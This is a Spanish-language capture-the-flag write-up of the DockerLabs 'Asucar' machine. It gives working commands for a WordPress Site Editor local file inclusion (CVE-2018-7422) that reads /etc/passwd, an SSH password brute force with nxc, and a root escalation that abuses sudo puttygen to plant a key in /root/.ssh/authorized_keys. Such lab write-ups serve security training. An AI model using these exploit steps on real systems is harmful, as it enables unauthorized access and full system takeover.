# Asucar (DockerLabs - Medio) WriteUp Español
[🦔](#PreRequerimientos) #PreRequerimientos

[🦔](#Reconocimiento) #Reconocimiento
- Escaneo usual (IP, TTL, Puertos, Versiones y Servicios, Launchpad)
- Enumeración de directorios

[🦔](#VulnGathering) #VulnGathering
- Reconocimiento con `wpscan`

[🦔](#Engaño) #Engaño
- Explotación LFI **CVE-2018-7422**

[🦔](#Explotación) #Explotación
- Ataque por fuerza bruta con `nxc`

[🦔](#GanarControl) #GanarControl
- Creación de claves en formato `OpenSSH` usando `puttygen`

[🦔](#Resultados-PoC) #Resultados-PoC
- Resumen de hallazgos

_Presiona al erizo para dirigirte al contenido._

## PreRequerimientos
Este documento son resultados y hallazgos obtenidos en una emulación de escenario de *prueba de penetración* en una modalidad de caja Gris.

La intención de la metodología usada es para presentar el reporte por *escenarios de riesgo*, mientras se obtiene el objetivo de la máquina objetivo. véase [[Metodología]]
#### Sobre la máquina
```http
Nombre: Asucar
Autor: The Hackers Labs
Objetivo: Control SO + root
Dificultad: Medio
Descargado de: https://mega.nz/file/sCtDHbjS#3FdcMCEsKE5Ea0taLVkx9Nt9Oj43fqm4Q6RBKCTOVac
writeup: kmxbay
```


Desde una conexión de red interna, el escenario de pruebas se compone de:
> IP Atacante: 172.17.0.1

> IP Víctima:   172.17.0.2

#### Consideraciones adicionales
Para esta máquina se desplegó el contenedor de docker.
```python
Máquina desplegada, su dirección IP es --> 172.17.0.2
```

<small>Durante el reporte se utiliza '[...]' para omitir partes que no serán de interés en el proceso de penetración.</small>

## Reconocimiento
Se identificó la dirección IP de la máquina objetivo mediante `ARP-scan`:
```python
$sudo arp-scan -I docker0 --localnet
[...]
172.17.0.2	02:42:ac:11:00:02	(Unknown: locally administered)
```

Se verificó la conectividad con un `ping`
```python
$ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.085 ms
```
Recibiendo respuestas con un TTL de *64*, lo cual indica un sistema *linux*.

Posteriormente se realizó un escaneo de puertos completo con Nmap:
```python
$nmap -p- -Pn -n --min-rate 5000 172.17.0.2
[...]
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Un escaneo más detallado se ejecutó, necesariamente con el parámetro `-Pn` para ~~poder meterse una buena pinga por el ort~~ identificar versiones y servicios:
```python
$sudo nmap -p22,80 -sSCV -Pn 172.17.0.2
[...]

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   [...]
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-generator: WordPress 6.5.3
|_http-title: Asucar Moreno
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Se siguió con el reconocimiento en el puerto 80 utilizando whatweb:
```python
$whatweb http://172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.59], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.59 (Debian)], IP[172.17.0.2], JQuery[3.7.1], MetaGenerator[WordPress 6.5.3], Script[importmap,module], Title[Asucar Moreno], UncommonHeaders[link], WordPress[6.5.3]
```

Se observó en el código y en el reconocimiento web, referencia al dominio `asucar.dl`, por lo que se añadió una entrada al `/etc/hosts` apuntando a `172.17.0.2`

Dentro de la página sin consultar el código fuente notamos el código siguiente:
```python
[sed_row_outer_outer sed_model_id=»sed_model_1″ sed_theme_id=»theme_id_2″ sed_main_content_row=»true» shortcode_tag=»sed_row» type=»static-element» length=»wide»][sed_module_outer_outer sed_model_id=»sed_model_2″ shortcode_tag=»sed_module»][sed_content_layout layout=»without-sidebar» title=»columns»]  
[sed_content_layout_column width=»100%» sed_main_content=»yes» parent_module=»content-layout»]
```

En un escaneo de directorios, se encontraron rutas de interés, las cuales, sin credenciales no es posible acceder.
```python
$dirb http://172.17.0.2
[...]                           
==> DIRECTORY: http://172.17.0.2/wordpress/                                      
==> DIRECTORY: http://172.17.0.2/wp-admin/                                       
==> DIRECTORY: http://172.17.0.2/wp-content/                                     
==> DIRECTORY: http://172.17.0.2/wp-includes/                                    
+ http://172.17.0.2/xmlrpc.php (CODE:405|SIZE:42)                                
[...]
+ http://172.17.0.2/wp-admin/admin.php (CODE:302|SIZE:0)                         [...]
---- Entering directory: http://172.17.0.2/wp-content/ ----
+ http://172.17.0.2/wp-content/index.php (CODE:200|SIZE:0)
---- Entering directory: http://172.17.0.2/wp-content/languages/ ----
---- Entering directory: http://172.17.0.2/wp-content/plugins/ ----
---- Entering directory: http://172.17.0.2/wp-content/themes/ ----
---- Entering directory: http://172.17.0.2/wp-content/upgrade/ ----
==> DIRECTORY: http://172.17.0.2/wp-content/uploads/                             
[...]
```
## VulnGathering
Con la información anterior, encontramos en `https://launchpad.net/debian/+source/openssh/1:9.2p1-2+deb12u1` lo siguiente sobre la versión de ssh:
```
  * Cherry-pick from OpenSSH 9.3p2:
    - [CVE-2023-38408] Fix a condition where specific libraries loaded via
      ssh-agent(1)'s PKCS#11 support could be abused to achieve remote code
      execution via a forwarded agent socket (closes: #1042460).
```

Por otro lado sobre las versiones de wordpress, encontramos lo siguiente:
```python
$searchsploit wordpress 6.5.3
------------------------------------------------- ----------------------------
 Exploit Title                                   |  Path
------------------------------------------------- ----------------------------
NEX-Forms WordPress plugin < 7.9.7 - Authenticat | php/webapps/51042.txt
WordPress Plugin DZS Videogallery < 8.60 - Multi | php/webapps/39553.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL  | php/webapps/44943.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQ | php/webapps/48918.sh
------------------------------------------------- ----------------------------
```

El reconocimiento de directorios, validó que se trata de un wordpress, se encontró el login del panel de administración (el cual podrá servir para validar usuarios de administración).

Aunque se identificó la vulneravilidad CVE-2023-38408 en OpenSSH, esta requiere que el atacante tenga acceso a un agente `ssh-agent` autenticado, lo cual no es viable en este entorno. Asimismo los plugins de wordpress detectados requieren autenticación o acceso previo, por lo que no representan vectores xplotables en estado actual.

Se tomó una herramienta de pentesting de wordpress con el siguiente resultado:
```python
$wpscan --url http://asucar.dl
[+] URL: http://asucar.dl/ [172.17.0.2]

Interesting Finding(s):
[...]
[+] XML-RPC seems to be enabled: http://asucar.dl/xmlrpc.php
 | [...]
[+] The external WP-Cron seems to be enabled: http://asucar.dl/wp-cron.php
 | [...]
[+] WordPress version 6.5.3 identified (Insecure, released on 2024-05-07).
 | [...]
[+] WordPress theme in use: twentytwentyfour
 | [...]
 | [!] The version is out of date, the latest version is 1.3
 | [!] Directory listing is enabled
 | [...]
[i] Plugin(s) Identified:
[+] site-editor
 | Location: http://asucar.dl/wp-content/plugins/site-editor/
 | [!] The version is out of date, the latest version is 1.1.1
 |
 | Found By: Urls In Homepage (Passive Detection)
 |  - http://asucar.dl/wp-content/plugins/site-editor/readme.txt
```

La existencia del archivo `xmlrpc.php` hace el sitio más vulnerable:
`XML-RPC` es una característica de wordpress que permite que los datos se transmitan, con HTTP actuando como el mecanismo de transporte y XML como el mecanismo de codificación. [fuente](https://www.hostinger.com/es/tutoriales/que-es-xmlrpc-php-wordpress-por-que-desactivarlo)

Hay una posible vulnerabilidad LFI, a través del tema `twentytwentyfour`

Sobre el ultimo plugin se encontró el siguiente exploit:
```python
$searchsploit site-editor 1.1.1
------------------------------------------------- -----------------------------
 Exploit Title                                   |  Path
------------------------------------------------- -----------------------------
WordPress Plugin Site Editor 1.1.1 - Local File  | php/webapps/44340.txt
------------------------------------------------- -----------------------------
```
## Engaño
El último exploit sugería un payload como el siguiente:
```python
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

Dado que el código está de la siguiente manera:
```php
if( isset( $_REQUEST['ajax_path'] ) && is_file( $_REQUEST['ajax_path'] ) && file_exists( $_REQUEST['ajax_path'] ) ){
    require_once $_REQUEST['ajax_path'];
}
```

Validamos la vulnerabilidad de la siguiente forma:
```python
$curl http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd | grep /bin/bash
[...]
root:x:0:0:root:/root:/bin/bash
curiosito:x:1000:1000::/home/curiosito:/bin/bash
```

  Conociendo un usuario de la máquina host, se validó su existencia en la administración de wordpress, aunque con resultados negativos porque el panel del login arroja el siguiente mensaje:
	**Error**: El nombre de usuario **curiosito** no está registrado en este sitio. Si no estás seguro de tu nombre de usuario, prueba con tu dirección de correo electrónico en su lugar.
## Explotación
Se creó un diccionario para iniciar un ataque de fuerza bruta y se ejecutó:
```python
$touch my_rockyou.txt && head -n 500 /usr/share/wordlists/rockyou.txt > my_rockyou.txt
$nxc ssh asucar.dl -u curiosito -p my_rockyou.txt --ignore-pw-decoding
[...]
SSH         172.17.0.2      22     asucar.dl        [+] curiosito:password1 (Pwn3d!) Linux - Shell access!
```

Se validó la información obtenida con un acceso a SSH:
```python
$ssh curiosito@asucar.dl
[...]
curiosito@185c8bd9fa1e:~$ pwd && ls -la
/home/curiosito
total 16
drwxr-xr-x 1 curiosito curiosito   88 May 12  2024 .
drwxr-xr-x 1 root      root        18 May 12  2024 ..
-rw------- 1 curiosito curiosito  362 May 12  2024 .bash_history
-rw-r--r-- 1 curiosito curiosito  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 curiosito curiosito 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 curiosito curiosito  807 Apr 23  2023 .profile
d-wxr-x--- 1 curiosito curiosito   42 May 12  2024 .ssh
```

## GanarControl
Como un inicio de escalación de privilegios, encontramos esto:
```python
curiosito@185c8bd9fa1e:~$ sudo -l
Matching Defaults entries for curiosito on 185c8bd9fa1e:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User curiosito may run the following commands on 185c8bd9fa1e:
    (root) NOPASSWD: /usr/bin/puttygen
```

El exploit de SSH **CVE-2023-38408** es para `ssh-agent` con sockets y librerías maliciosas, pero como ya tenemos un acceso root indicado a través de `puttygen`.

PuTTYgen es una herramienta generadora de llaves para crear claves SSH públicas y privadas.[fuente](https://www.puttygen.com/)
Podemos aprovecar este binario para crear una clave SSH como root en `authorized_keys`.

Generamos una clave SSH: `$ssh-keygen -t rsa -b 2048 -f rootkey`.
- `rootkey` es la clave privada
- `rootkey.pub` es la clave pública

A través de un recurso compartido se subió la clave generada a la máquina víctima:
```python
curiosito@185c8bd9fa1e:~$ wget http://172.17.0.1:8000/rootkey
[...]
Saving to: 'rootkey'

rootkey              100%[=====================>]   1.78K  --.-KB/s    in 0s     
```

Se creó la clave pública en formato OpenSSH (válida para `authorized_keys`) usando `puttygen` como root. Para después procder con poner el archivo en el lugar correcto usando el mismo binario.
```python
curiosito@185c8bd9fa1e:~$ sudo /usr/bin/puttygen rootkey -O public-openssh -o authorized_keys
curiosito@185c8bd9fa1e:~$ ls
authorized_keys  key.pub  rootkey
curiosito@185c8bd9fa1e:~$ sudo /usr/bin/puttygen authorized_keys -O public-openssh -o /root/.ssh/authorized_keys
```

## Resultados-PoC
En nuestra máquina atacante nos podemos conectar por ssh, teniendo la explotación ejecutada anterior:
```js
$ssh -i rootkey root@asucar.dl
Linux 185c8bd9fa1e 6.12.12-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.12-1parrot1 (2025-02-27) x86_64

[...]

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@185c8bd9fa1e:~#
```


### Hallazgos de postura de seguridad
**Reconocimiento:**
- Uso necesario de  `-Pn` para escaneo de puertos
- Versión vulnerable de ssh **CVE-2023-38408**
- Versión antigua de wordpress
- Código fuente filtrado en página principal
- Acceso a panel de administración y directorios sensibles de wordpress
**VulnGathering:**
- Existencia de xmlrpc.php
- Posible LFI, a través del tema twentytwentyfour.
- RFI en plugin site-editor 1.1.1 **CVE-2018-7422**
**Engaño:**
- LFI con **CVE-2018-7422**
**Explotación:**
- Ataque por fuerza bruta SSH
**GanarControl:**
- Permisos inseguros para `/usr/bin/puttygen`

